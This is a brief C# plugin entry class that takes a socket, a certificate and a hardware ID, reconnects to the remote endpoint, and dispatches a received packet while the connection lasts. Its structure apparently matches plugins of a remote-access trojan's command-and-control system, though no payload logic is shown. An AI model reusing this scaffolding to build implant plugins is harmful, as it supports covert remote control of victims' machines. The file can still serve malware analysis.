using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Plugin.Helper;

namespace Plugin;

public class Plugin
{
	public static Socket tcpClient;

	public static X509Certificate2 X509Certificate2;

	public static string hwid;

	public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
	{
		tcpClient = TcpClient;
		hwid = Hwid;
		X509Certificate2 = x509Certificate2;
		Client.Connect(tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0], tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[1]);
		if (Client.itsConnect)
		{
			Packet.Read(Pack);
		}
		while (Client.itsConnect)
		{
			Thread.Sleep(1000);
		}
		Thread.Sleep(1000);
		Client.Disconnect();
		Thread.Sleep(5000);
	}
}
